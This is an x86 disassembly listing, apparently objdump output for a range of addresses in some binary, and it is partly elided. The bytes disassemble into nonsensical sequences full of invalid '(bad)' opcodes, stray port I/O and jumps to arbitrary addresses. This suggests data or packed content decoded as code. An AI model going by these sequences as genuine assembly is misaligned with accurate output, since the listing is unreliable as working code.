  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x7094dc2c]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    ah,bl
  41e74d:	pusha  
  41e74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e74f:	in     eax,dx
  41e750:	js     0x41e760
  41e752:	mov    ecx,0xdd2226e4
  41e757:	mov    esi,0xd29d3bf8
  41e75c:	xchg   ebx,eax
  41e75d:	sub    edi,DWORD PTR [ecx-0x16]
  41e760:	ins    BYTE PTR es:[edi],dx
  41e761:	xor    BYTE PTR [ebp+eax*8+0x5d],bh
  41e765:	and    cl,BYTE PTR [esi+eiz*4+0x4b]
  41e769:	adc    al,0xfd
  41e76b:	mov    ds:0xeeb8acc2,eax
  41e770:	js     0x41e701
  41e772:	scas   al,BYTE PTR es:[edi]
  41e773:	sub    eax,edi
  41e775:	(bad)  
  41e776:	push   edi
  41e777:	into   
  41e778:	push   ecx
  41e779:	mov    edi,0x4b738c38
  41e77e:	stos   BYTE PTR es:[edi],al
  41e77f:	sbb    ebx,DWORD PTR [ecx+eiz*8]
  41e782:	jp     0x41e710
  41e784:	jp     0x41e739
  41e786:	lods   eax,DWORD PTR ds:[esi]
  41e787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e788:	pop    esp
  41e789:	mov    ebx,DWORD PTR es:[eax+esi*4+0x40a0cae6]
  41e791:	or     eax,0x920ca556
  41e796:	fcomp  QWORD PTR [esp+eiz*4]
  41e799:	imul   edx,DWORD PTR [ebp+0x4b],0x6b7f60a0
  41e7a0:	push   edi
  41e7a1:	dec    eax
  41e7a2:	lahf   
  41e7a3:	jnp    0x41e81e
  41e7a5:	iret   
  41e7a6:	push   ecx
  41e7a7:	and    eax,0xda9ecd37
  41e7ac:	sar    DWORD PTR [ebp+0x1a],0xc6
  41e7b0:	loope  0x41e762
  41e7b2:	xchg   esi,eax
  41e7b3:	pop    edx
  41e7b4:	test   DWORD PTR [ebx+0x48],0x2c189234
  41e7bb:	in     al,0xc0
  41e7bd:	mov    al,0x95
  41e7bf:	iret   
  41e7c0:	xor    edx,DWORD PTR [esi+0x49cf2a97]
  41e7c6:	inc    edx
  41e7c7:	mov    bl,BYTE PTR ds:0x56ef3bf1
  41e7cd:	call   0xa705:0x4edfda33
  41e7d4:	pusha  
  41e7d5:	arpl   bp,sp
  41e7d7:	test   DWORD PTR [eax],esp
  41e7d9:	out    0xac,al
  41e7db:	mov    eax,DWORD PTR [esi]
  41e7dd:	aaa    
  41e7de:	inc    ebx
  41e7e0:	add    BYTE PTR [esi],bh
  41e7e2:	dec    ecx
  41e7e3:	jns    0x41e854
  41e7e5:	jl     0x41e799
  41e7e7:	pop    ecx
  41e7e8:	add    edx,eax
  41e7ea:	xor    eax,0xa04b68d3
  41e7ef:	xor    eax,0xcb6560be
  41e7f4:	mov    ds:0xccea1c7b,al
  41e7f9:	stos   BYTE PTR es:[edi],al
  41e7fa:	pop    eax
  41e7fb:	cmp    BYTE PTR [ebx+0x36],0x44
  41e7ff:	inc    ebx
  41e800:	push   edi
  41e801:	stos   BYTE PTR es:[edi],al
  41e802:	cmp    BYTE PTR ss:[edx+0x2ee32a98],cl
  41e809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80a:	outs   dx,DWORD PTR ss:[esi]
  41e80c:	pop    ebp
  41e80d:	jl     0x41e7dc
  41e80f:	adc    BYTE PTR [edi+esi*2+0x7e],bh
  41e813:	neg    DWORD PTR [ebx-0x41]
  41e816:	mov    dl,BYTE PTR [ebx+ecx*1-0x2d]
  41e81a:	sti    
  41e81b:	ficomp DWORD PTR [esp+ecx*8+0x2d]
  41e81f:	inc    eax
  41e820:	inc    esi
  41e821:	das    
  41e822:	clc    
  41e823:	lods   al,BYTE PTR ds:[esi]
  41e824:	pop    eax
  41e825:	maskmovq mm6,(bad)
  41e826:	div    DWORD PTR [ebx-0x78a635a]
  41e82c:	add    al,0x97
  41e82e:	vandnps ymm6,ymm3,ymm3
  41e832:	mov    bh,0xfd
  41e834:	call   0x73b7bf08
  41e839:	or     ebp,edx
  41e83b:	adc    eax,0xe1e64387
  41e840:	pop    edx
  41e841:	inc    BYTE PTR [eax]
	...
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	or     ebx,esi
  41e8c2:	test   DWORD PTR [esi+0x14886],eax
  41e8c8:	test   BYTE PTR [eax],0x0
  41e8cb:	add    BYTE PTR [edi-0x64f874fa],al
  41e8d1:	cmp    ecx,DWORD PTR [ecx+0x30]
  41e8d4:	xor    BYTE PTR [ebx+0x30],0x34
  41e8d8:	loopne 0x41e954
  41e8da:	stc    
  41e8db:	mov    eax,0xe2929c5e
  41e8e0:	xchg   esi,eax
  41e8e1:	pop    ecx
  41e8e2:	sbb    dl,al
  41e8e4:	or     DWORD PTR [esi],0x23
  41e8e7:	fcom   st(6)
  41e8e9:	loop   0x41e966
  41e8eb:	and    DWORD PTR [edi-0xa],esi
  41e8ee:	cli    
  41e8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8f0:	int    0xe2
  41e8f2:	test   BYTE PTR [esp+edx*4],bh
  41e8f5:	dec    esi
  41e8f6:	dec    esp
  41e8f7:	enter  0x4e27,0x38
  41e8fb:	les    edx,FWORD PTR [eax]
  41e8fd:	adc    bh,BYTE PTR [ecx*4+0x1169cf6e]
  41e904:	and    DWORD PTR [edx-0x66d122be],esi
  41e90a:	data16 idiv BYTE PTR [edi+0x749c4f3e]
  41e911:	jmp    0x56546df2
  41e916:	out    0xe4,eax
  41e918:	inc    esi
  41e919:	repz cwde 
  41e91b:	push   es
  41e91c:	vpminub ymm1,ymm0,YMMWORD PTR [edi+0x59]
  41e921:	aad    0xb0
  41e923:	jbe    0x41e946
  41e925:	inc    edx
  41e926:	js     0x41e8aa
  41e928:	push   esi
  41e929:	cmp    DWORD PTR [ebx],0x7c
  41e92c:	pop    edx
  41e92d:	dec    esp
  41e92e:	fadd   DWORD PTR [eax+esi*2+0x7e808de0]
  41e935:	ins    DWORD PTR es:[edi],dx
  41e936:	jno    0x41e995
  41e938:	dec    ecx
  41e939:	call   0x32c80e0f
  41e93e:	xchg   edi,eax
  41e93f:	popf   
  41e940:	add    DWORD PTR [ebx-0x4d],0xffffff8b
  41e944:	mov    ah,0x6b
  41e946:	mov    eax,DWORD PTR [edx+0x43]
  41e949:	mov    BYTE PTR [ecx+ebx*4-0x78],dl
  41e94d:	cs popf 
  41e94f:	repz adc al,0x63
  41e952:	aas    
  41e953:	js     0x41e92b
  41e955:	pop    ss
  41e956:	push   0x7070e521
  41e95b:	test   al,0xd5
  41e95d:	mov    eax,cs
  41e95f:	pop    esi
  41e960:	(bad)  
  41e961:	lock loop 0x41e953
  41e964:	add    cl,cl
  41e966:	clc    
  41e967:	in     eax,0xc6
  41e969:	mov    ds:0x3f664cec,eax
  41e96e:	cdq    
  41e96f:	fs pop ebp
  41e971:	rol    DWORD PTR [ebx],1
  41e973:	lahf   
  41e974:	outs   dx,BYTE PTR ds:[esi]
  41e975:	loop   0x41e97e
  41e977:	mov    edx,ebp
  41e979:	pop    ds
  41e97a:	mov    ebx,0x562246df
  41e97f:	add    edi,DWORD PTR [ecx+0x7eb559eb]
  41e985:	cmp    al,0xa6
  41e987:	mov    dl,0x49
  41e989:	sahf   
  41e98a:	fist   WORD PTR [esi-0x1cfa385d]
  41e990:	add    ah,BYTE PTR [ebx-0x6e]
  41e993:	loop   0x41e9c8
  41e995:	aas    
  41e996:	enter  0x4e14,0x58
  41e99a:	push   ebp
  41e99b:	inc    eax
  41e99c:	xchg   DWORD PTR [esi-0x1d],edi
  41e99f:	rcr    DWORD PTR [eax+ebp*8-0x112012f1],cl
  41e9a6:	mov    ds:0xabb76aa2,al
  41e9ab:	popf   
  41e9ac:	pop    es
  41e9ad:	or     esi,edi
  41e9af:	and    BYTE PTR [edx-0x73],0xda
  41e9b3:	jmp    0x41ea0e
  41e9b5:	cmp    DWORD PTR [ebx-0x14bd4ea9],edi
  41e9bb:	and    dh,dl
  41e9bd:	and    ebp,ebx
  41e9bf:	cli    
  41e9c0:	(bad)  
  41e9c1:	mov    dh,0x0
	...
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fld    QWORD PTR [esi-0x7]
  41ea42:	jl     0x41ea69
  41ea44:	jl     0x41ea8f
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	test   BYTE PTR [eax],0x0
  41ea4b:	add    dl,ah
  41ea4d:	icebp  
  41ea4e:	cmp    DWORD PTR [ebx],esp
  41ea50:	(bad)  
  41ea51:	fstp   TBYTE PTR [ebx]
  41ea53:	(bad)  
  41ea54:	dec    edi
  41ea55:	xor    eax,0x5445601b
  41ea5a:	mov    ds:0x4911b7dd,al
  41ea5f:	and    ebx,DWORD PTR ds:0xdf61072
  41ea65:	(bad)  
  41ea66:	pop    ecx
  41ea67:	and    edi,eax
  41ea69:	js     0x41eaca
  41ea6b:	xchg   edx,eax
  41ea6c:	lock inc esi
  41ea6e:	adc    eax,0xe8dade93
  41ea73:	leave  
  41ea74:	arpl   WORD PTR [esi+0x246db27b],sp
  41ea7a:	stc    
  41ea7b:	nop
  41ea7c:	xchg   edx,eax
  41ea7d:	pop    eax
  41ea7e:	mov    ds,WORD PTR [edi]
  41ea80:	in     eax,dx
  41ea81:	aas    
  41ea82:	aam    0x3a
  41ea84:	lea    ebp,[ebp-0x660de91a]
  41ea8a:	push   edx
  41ea8b:	cmp    DWORD PTR [ebp+0x46],0x4a
  41ea8f:	retf   0x3de
  41ea92:	push   es
  41ea93:	sub    ebx,esi
  41ea95:	ins    DWORD PTR es:[edi],dx
  41ea96:	sbb    cl,bh
  41ea98:	add    al,0xe4
  41ea9a:	addr16 cdq 
  41ea9c:	mov    eax,ds:0x1ab8f8f8
  41eaa1:	dec    esi
  41eaa2:	out    dx,al
  41eaa3:	fadd   DWORD PTR [eax]
  41eaa5:	mov    edx,0x158496f0
  41eaaa:	xchg   esi,eax
  41eaab:	add    ebx,DWORD PTR es:[edx]
  41eaae:	xchg   edi,eax
  41eaaf:	jg     0x41ea85
  41eab1:	stc    
  41eab2:	push   cs
  41eab3:	pop    ebp
  41eab4:	add    al,BYTE PTR [ebp-0x13]
  41eab7:	je     0x41ea66
  41eab9:	adc    eax,0x96298e5e
  41eabe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eabf:	mov    ecx,0x23fb00a2
  41eac4:	les    edx,FWORD PTR [ecx+0x625115b3]
  41eaca:	in     eax,dx
  41eacb:	test   eax,0xf587275f
  41ead0:	fdiv   DWORD PTR [eax+0x5ea5ec43]
  41ead6:	popa   
  41ead7:	adc    al,0x9a
  41ead9:	jmp    0xc2eac4
  41eade:	sbb    DWORD PTR [esi-0x32],0xd1bdd06
  41eae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae6:	out    0xd2,eax
  41eae8:	mov    edx,0x1d932f5b
  41eaed:	mov    cl,0x89
  41eaef:	xchg   edx,eax
  41eaf0:	mov    esi,0x2fb1c520
  41eaf5:	push   0x73
  41eaf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaf8:	(bad)  
  41eaf9:	repz test BYTE PTR [edx-0x2ca16fdb],dl
  41eb00:	inc    BYTE PTR [edx+edx*8-0x77c27467]
  41eb07:	in     al,0x32
  41eb09:	jmp    0xddd0b875
  41eb0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb0f:	int3   
  41eb10:	push   cs
  41eb11:	pop    ecx
  41eb12:	mov    ?,ebx
  41eb14:	sbb    ch,BYTE PTR [eax]
  41eb16:	inc    esi
  41eb17:	dec    edx
  41eb18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb19:	push   esp
  41eb1a:	je     0x41eb59
  41eb1c:	xchg   esp,eax
  41eb1d:	out    0xf6,al
  41eb1f:	out    dx,al
  41eb20:	shl    DWORD PTR [eax+0x12],0x8
  41eb24:	xchg   dh,dl
  41eb26:	add    eax,0x6701cdde
  41eb2b:	adc    eax,0x9383f1af
  41eb30:	mov    edx,0x3bf4bb0d
  41eb35:	outs   dx,BYTE PTR ds:[esi]
  41eb36:	inc    ecx
  41eb37:	sub    ebp,DWORD PTR [ebx-0x599003c1]
  41eb3d:	gs push ecx
  41eb3f:	mov    esp,0x9c92
	...
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	retf   0x9815
  41ebb8:	mov    ch,0xdf
  41ebba:	out    dx,eax
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	ror    DWORD PTR [eax+0x4a729c65],0x1
  41ebc7:	add    dh,dh
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [edx-0x15],dl
  41ebce:	mov    ss,ecx
  41ebd0:	and    DWORD PTR [ebp-0x5df95d61],edx
  41ebd6:	pop    ebp
  41ebd7:	mov    dh,0x1
  41ebd9:	and    DWORD PTR [ecx+0x16],0xef027f4
  41ebe0:	push   edx
  41ebe1:	add    edx,ebp
  41ebe3:	fiadd  WORD PTR [edx]
  41ebe5:	stc    
  41ebe6:	mov    ch,0x34
  41ebe8:	dec    eax
  41ebe9:	imul   edi,esi,0xc57421b4
  41ebef:	add    BYTE PTR [ebx+edx*1-0x6a],ch
  41ebf3:	dec    ecx
  41ebf4:	or     eax,0x3a87849f
  41ebf9:	push   eax
  41ebfa:	mov    eax,0xd51f2d92
  41ebff:	bswap  esi
  41ec01:	push   ebp
  41ec02:	jae    0x41ec04
  41ec04:	aad    0x25
  41ec06:	fisub  DWORD PTR ds:0xccabb2bf
  41ec0c:	cmp    esp,DWORD PTR [ebp-0x21694e19]
  41ec12:	out    0xd,eax
  41ec14:	test   BYTE PTR [esi+edi*4],bh
  41ec17:	(bad)  
  41ec18:	mov    WORD PTR [edx-0x37],?
  41ec1b:	add    ch,BYTE PTR [ebx]
  41ec1d:	jbe    0x41ec9c
  41ec1f:	mov    esi,0xbdc0dd02
  41ec24:	retf   
  41ec25:	inc    ebx
  41ec26:	push   ebx
  41ec27:	push   eax
  41ec28:	(bad)
  41ec2c:	push   edi
  41ec2d:	and    ecx,ebp
  41ec2f:	dec    eax
  41ec30:	cdq    
  41ec31:	xor    ebx,ecx
  41ec33:	add    eax,0xaa473134
  41ec38:	stc    
  41ec39:	jns    0x41ebd9
  41ec3b:	data16 xor dh,ch
  41ec3e:	(bad)  
  41ec3f:	scas   eax,DWORD PTR es:[edi]
  41ec40:	xchg   edx,eax
  41ec41:	leave  
  41ec42:	jnp    0x41ec8c
  41ec44:	test   eax,0x8e26611f
  41ec49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec4a:	fcmovu st,st(2)
  41ec4c:	(bad)  
  41ec4d:	jle    0x41ec6e
  41ec4f:	push   ss
  41ec50:	sub    al,BYTE PTR [ecx+0x3b]
  41ec53:	(bad)  
  41ec55:	jl     0x41ec20
  41ec57:	dec    ecx
  41ec58:	scas   eax,DWORD PTR es:[edi]
  41ec59:	push   ebx
  41ec5a:	dec    edi
  41ec5b:	xchg   dh,bl
  41ec5d:	test   DWORD PTR [ebp+0x18a44af8],ecx
  41ec63:	xchg   ebx,eax
  41ec64:	cwde   
  41ec65:	cwde   
  41ec66:	in     eax,0xe6
  41ec68:	fisub  DWORD PTR [esi-0x10]
  41ec6b:	jbe    0x41ec0c
  41ec6d:	mov    ecx,0x8a85b9e2
  41ec72:	pop    esp
  41ec73:	and    cl,BYTE PTR ds:0x6fdd4767
  41ec79:	jns    0x41ec74
  41ec7b:	xchg   ebx,eax
  41ec7c:	retf   
  41ec7d:	dec    eax
  41ec7e:	fs inc esp
  41ec80:	loope  0x41ec3e
  41ec82:	mov    dl,0x92
  41ec84:	adc    ebp,edi
  41ec86:	mov    BYTE PTR [ebp+0x3f],0x35
  41ec8a:	je     0x41ec98
  41ec8c:	stos   DWORD PTR es:[edi],eax
  41ec8d:	(bad)  
  41ec8e:	pop    edx
  41ec8f:	mov    esp,0xe138d6cb
  41ec94:	dec    edx
  41ec95:	bound  esp,QWORD PTR [eax]
  41ec97:	stos   BYTE PTR es:[edi],al
  41ec98:	lds    edi,FWORD PTR [eax+edx*8]
  41ec9b:	(bad)  
  41ec9c:	xchg   ebp,eax
  41ec9d:	in     al,dx
  41ec9e:	and    al,0x2b
  41eca0:	pop    es
  41eca1:	push   esp
  41eca2:	add    al,0x7f
  41eca4:	xchg   edi,eax
  41eca5:	enter  0xfbbf,0x89
  41eca9:	jbe    0x41ed0e
  41ecab:	out    0x1d,eax
  41ecad:	out    dx,eax
  41ecae:	test   al,0x64
  41ecb0:	xor    eax,0xc733b8a
  41ecb5:	and    ebx,0xffffffee
  41ecb8:	pop    edx
  41ecb9:	sub    al,0x9b
  41ecbb:	jnp    0x41ecbc
  41ecbd:	adc    edx,DWORD PTR [ebp+ebx*8+0xf700]
	...
  41ed34:	and    bl,dh
  41ed36:	das    
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	sbb    BYTE PTR [ebp+0x4b68b26d],ah
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	test   BYTE PTR [eax],0x0
  41ed4b:	add    BYTE PTR [edx],cl
  41ed4d:	fs push edi
  41ed4f:	mov    bx,0xffc6
  41ed53:	idiv   DWORD PTR [edx+0x5e]
  41ed56:	std    
  41ed57:	popa   
  41ed58:	and    DWORD PTR [esi+0x37091e18],ecx
  41ed5e:	push   es
  41ed5f:	jmp    0xb4117a8
  41ed64:	push   cs
  41ed65:	test   al,0x28
  41ed67:	mov    ah,0x45
  41ed69:	das    
  41ed6a:	call   0x6172d13e
  41ed6f:	retf   0xb9d1
  41ed72:	repz stc 
  41ed74:	adc    al,0xb0
  41ed76:	nop
  41ed77:	mov    cl,0xed
  41ed79:	sahf   
  41ed7a:	inc    ecx
  41ed7b:	add    DWORD PTR [edi+eax*2+0x1f],0xffffffd0
  41ed80:	mov    edi,edx
  41ed82:	out    0x16,eax
  41ed84:	and    edi,0xffffffe2
  41ed87:	into   
  41ed88:	cmp    DWORD PTR [edi-0x30163859],esi
  41ed8e:	lods   al,BYTE PTR ds:[esi]
  41ed8f:	ret    
  41ed90:	lock fwait
  41ed92:	ins    DWORD PTR es:[edi],dx
  41ed93:	mov    ebp,0x7ec05a9
  41ed98:	(bad)  
  41ed99:	adc    edx,DWORD PTR [edi]
  41ed9b:	mov    cl,0x1d
  41ed9d:	sbb    bl,BYTE PTR [edx+0x17]
  41eda0:	lock retf 0x229a
  41eda4:	call   0x8cbe5b0b
  41eda9:	add    edx,0x58
  41edac:	leave  
  41edad:	inc    ebp
  41edae:	mov    bl,0x24
  41edb0:	dec    ebp
  41edb1:	inc    esp
  41edb2:	push   ss
  41edb3:	add    DWORD PTR [ecx-0x45],esp
  41edb6:	mov    eax,ds:0x692e0d8b
  41edbb:	aaa    
  41edbc:	jne    0x41edfa
  41edbe:	push   es
  41edbf:	in     al,dx
  41edc0:	into   
  41edc1:	fbstp  TBYTE PTR [ebp-0x2]
  41edc4:	or     eax,esp
  41edc6:	push   ecx
  41edc7:	cmp    dh,BYTE PTR [ebx+0x30]
  41edca:	adc    eax,0xeb48a47e
  41edcf:	sub    al,0x55
  41edd1:	mov    al,0x1d
  41edd3:	dec    edx
  41edd4:	xor    eax,0xa2feb6f8
  41edd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edda:	jmp    0x4d5:0x59e940d5
  41ede1:	and    DWORD PTR [esi+eax*8],esi
  41ede4:	(bad)  
  41ede5:	js     0x41ede4
  41ede7:	push   edi
  41ede8:	in     al,dx
  41ede9:	and    ah,BYTE PTR ds:0x62dbe177
  41edef:	and    BYTE PTR [ecx+ecx*4+0x78],0xf6
  41edf4:	sub    ebx,ebp
  41edf6:	arpl   WORD PTR [edx+0x47],sp
  41edf9:	fadd   DWORD PTR [esi-0xf1e4f01]
  41edff:	(bad)  
  41ee00:	hlt    
  41ee01:	call   0xf364:0x1d81e0ab
  41ee08:	std    
  41ee09:	sub    eax,0x38feb9d3
  41ee0e:	jle    0x41ee56
  41ee10:	ins    BYTE PTR es:[edi],dx
  41ee11:	mov    dl,0xa3
  41ee13:	fimul  DWORD PTR [eax+0x14]
  41ee16:	adc    al,0x58
  41ee18:	lods   eax,DWORD PTR ds:[esi]
  41ee19:	pop    ss
  41ee1a:	pop    ecx
  41ee1b:	mov    ah,0x95
  41ee1d:	xchg   DWORD PTR [ebx+ebp*4],eax
  41ee20:	(bad)  
  41ee21:	or     DWORD PTR [ebx-0x4cce53a1],eax
  41ee27:	jmp    0x8540a718
  41ee2c:	inc    edx
  41ee2d:	cmp    al,BYTE PTR [ecx-0x37b8fbf5]
  41ee33:	pop    esi
  41ee34:	push   edi
  41ee35:	or     ch,BYTE PTR [ebp+edx*2+0x22]
  41ee39:	adc    DWORD PTR [esp+eax*4],ebp
  41ee3c:	adc    eax,0x54d700bd
  41ee41:	and    eax,0x0
	...
  41eeb2:	add    BYTE PTR [eax],al
  41eeb4:	aas    
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	stos   DWORD PTR es:[edi],eax
  41eec1:	(bad)  
  41eec3:	(bad)  
  41eec4:	pop    esi
  41eec5:	dec    esp
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    BYTE PTR [ebx+0x41],bh
  41eece:	ds jmp 0x97c4:0xb597947d
  41eed6:	or     al,BYTE PTR [esi-0x2a026ccb]
  41eedc:	inc    ebp
  41eedd:	and    edx,esi
  41eedf:	packssdw mm3,QWORD PTR [esi+eiz*4]
  41eee3:	push   ebx
  41eee4:	mov    cs,WORD PTR [esi+eiz*4-0x55681d85]
  41eeeb:	je     0x41ef08
  41eeed:	imul   eax,DWORD PTR [ebx-0x1782e16f],0x55f8b20a
  41eef7:	enter  0x4133,0x91
  41eefb:	ja     0x41ee7e
  41eefd:	jp     0x41ef26
  41eeff:	sar    dl,cl
  41ef01:	jmp    0x933582d
  41ef06:	dec    ebx
  41ef07:	lea    ebx,[edx-0x1859654a]
  41ef0d:	push   edx
  41ef0e:	jp     0x41eed1
  41ef10:	imul   ch
  41ef12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef13:	push   ds
  41ef14:	push   ebx
  41ef15:	iret   
  41ef16:	outs   dx,BYTE PTR ds:[esi]
  41ef17:	cwde   
  41ef18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef19:	sub    DWORD PTR [ecx],edi
  41ef1b:	dec    ebp
  41ef1c:	shr    DWORD PTR [ebp-0x35],0x51
  41ef20:	push   ss
  41ef21:	clc    
  41ef22:	jns    0x41eec4
  41ef24:	push   esi
  41ef25:	lock sub BYTE PTR [eax],0xa0
  41ef29:	xor    eax,0x62b11bb3
  41ef2e:	mov    esi,DWORD PTR [ecx+0x10]
  41ef31:	and    al,0x7c
  41ef33:	stos   DWORD PTR es:[edi],eax
  41ef34:	data16 add al,0x97
  41ef37:	pushf  
  41ef38:	cmp    eax,DWORD PTR [edi+0x39c17a97]
  41ef3e:	and    BYTE PTR [edi+ebx*8],cl
  41ef41:	std    
  41ef42:	adc    eax,ecx
  41ef44:	(bad)  [esi+0xa3ccfd3]
  41ef4a:	jecxz  0x41eef1
  41ef4c:	sbb    al,0x6
  41ef4e:	mov    dl,0xa6
  41ef50:	cwde   
  41ef51:	jo     0x41eee2
  41ef53:	enter  0xbb02,0xec
  41ef57:	cli    
  41ef58:	ror    al,cl
  41ef5a:	mov    dh,0x42
  41ef5c:	mov    ch,0x77
  41ef5e:	mov    esp,0x1534387b
  41ef63:	jbe    0xce923300
  41ef69:	xchg   edx,eax
  41ef6a:	in     al,dx
  41ef6b:	loopne 0x41ef03
  41ef6d:	jmp    0x4f6f2602
  41ef72:	(bad)
  41ef76:	rcr    BYTE PTR [ebx+0x1c],1
  41ef79:	pop    edi
  41ef7a:	sbb    DWORD PTR [edi+0x9],eax
  41ef7d:	dec    ebp
  41ef7e:	mov    ch,0xec
  41ef80:	idiv   BYTE PTR [edi]
  41ef82:	imul   edx,DWORD PTR [eax+0x777e7d92],0xffffffd1
  41ef89:	and    ebp,DWORD PTR [esi-0x2b]
  41ef8c:	cld    
  41ef8d:	pop    esi
  41ef8e:	xchg   ebx,eax
  41ef8f:	fcom   DWORD PTR [ebx+0x4fa4a11a]
  41ef95:	cmp    DWORD PTR [si-0x6],0xa838594d
  41ef9d:	jle    0x41ef77
  41ef9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efa0:	xor    bl,BYTE PTR [eax]
  41efa2:	enter  0xd34a,0xa
  41efa6:	add    BYTE PTR [edx+ebp*2+0x72],0xef
  41efab:	and    edi,esp
  41efad:	pop    esi
  41efae:	mov    WORD PTR [ebx-0x3e],es
  41efb1:	rcl    BYTE PTR [eax-0x38],cl
  41efb4:	(bad)  
  41efb5:	cmp    al,0x8b
  41efb7:	mov    ds:0x91d8f47b,al
  41efbc:	push   cs
  41efbd:	out    dx,al
  41efbe:	or     al,0xa1
  41efc0:	call   0x41f040
	...
  41f031:	add    BYTE PTR [eax],al
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x4b]
  41f041:	lahf   
  41f042:	xchg   esp,eax
  41f044:	push   esp
  41f045:	dec    ebp
  41f046:	add    DWORD PTR [eax],eax
  41f048:	test   BYTE PTR [eax],0x0
  41f04b:	add    ch,bl
  41f04d:	fwait
  41f04e:	mov    al,0x23
  41f050:	mov    edi,0x4180da0d
  41f055:	ja     0x41f061
  41f057:	lods   al,BYTE PTR ds:[esi]
  41f058:	mov    ?,ecx
  41f05a:	sub    ch,BYTE PTR [ecx]
  41f05c:	sar    bh,1
  41f05e:	add    ebp,ebx
  41f060:	mov    eax,ds:0x428c0c5d
  41f065:	imul   esi,DWORD PTR [edi],0x64e23438
  41f06b:	out    0xe7,eax
  41f06d:	and    BYTE PTR [edi],cl
  41f06f:	icebp  
  41f070:	mov    bl,0x49
  41f072:	in     eax,dx
  41f073:	bound  ecx,QWORD PTR [ecx+0x78]
  41f076:	int3   
  41f077:	loopne 0x41f023
  41f079:	adc    ah,BYTE PTR [esi]
  41f07b:	addr16 cdq 
  41f07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07e:	push   ds
  41f07f:	jne    0x41f0ee
  41f081:	gs stos DWORD PTR es:[edi],eax
  41f083:	(bad)  
  41f085:	inc    esp
  41f086:	jnp    0x41f0df
  41f088:	stos   BYTE PTR es:[edi],al
  41f089:	inc    ebx
  41f08a:	jge    0x41f034
  41f08c:	je     0x41f05d
  41f08e:	jae    0x41f049
  41f090:	rcr    ecx,0x4e
  41f093:	mov    ebp,0xebf438d8
  41f098:	(bad)  
  41f099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f09a:	cmp    dl,bl
  41f09c:	xchg   esp,eax
  41f09d:	aaa    
  41f09e:	aas    
  41f09f:	pop    DWORD PTR [eax+0x61]
  41f0a2:	jmp    0x85f22ce3
  41f0a7:	jns    0x41f0b8
  41f0a9:	fiadd  DWORD PTR [edi]
  41f0ab:	aaa    
  41f0ac:	push   ebx
  41f0ad:	stos   DWORD PTR es:[edi],eax
  41f0ae:	jo     0x41f06a
  41f0b0:	pop    gs
  41f0b2:	mov    ch,0x13
  41f0b4:	xchg   ecx,eax
  41f0b5:	push   ecx
  41f0b6:	lds    eax,FWORD PTR [ecx]
  41f0b8:	lea    esp,[ecx+ebx*1]
  41f0bb:	cmp    ecx,edx
  41f0bd:	sub    DWORD PTR [edx+0x16b4a6],edx
  41f0c3:	add    esp,DWORD PTR ds:0x5b763002
  41f0c9:	cmp    eax,0x84590fe8
  41f0ce:	or     edx,DWORD PTR [ebp-0x3dbafd6d]
  41f0d4:	cli    
  41f0d5:	mov    ah,0xd5
  41f0d7:	dec    ebp
  41f0d8:	sub    ecx,ecx
  41f0da:	dec    esp
  41f0db:	adc    ah,BYTE PTR [ebp+0x2452c4d7]
  41f0e1:	fild   WORD PTR [edi]
  41f0e3:	shl    BYTE PTR [edx-0x23],cl
  41f0e6:	cmp    al,0xe4
  41f0e8:	es cld 
  41f0ea:	cdq    
  41f0eb:	test   dh,dh
  41f0ed:	jae    0x41f085
  41f0ef:	pushf  
  41f0f0:	push   esi
  41f0f1:	push   esi
  41f0f2:	mov    dh,0x64
  41f0f4:	test   DWORD PTR [edx],0x68a68eac
  41f0fa:	inc    ebp
  41f0fb:	cmp    esi,ebp
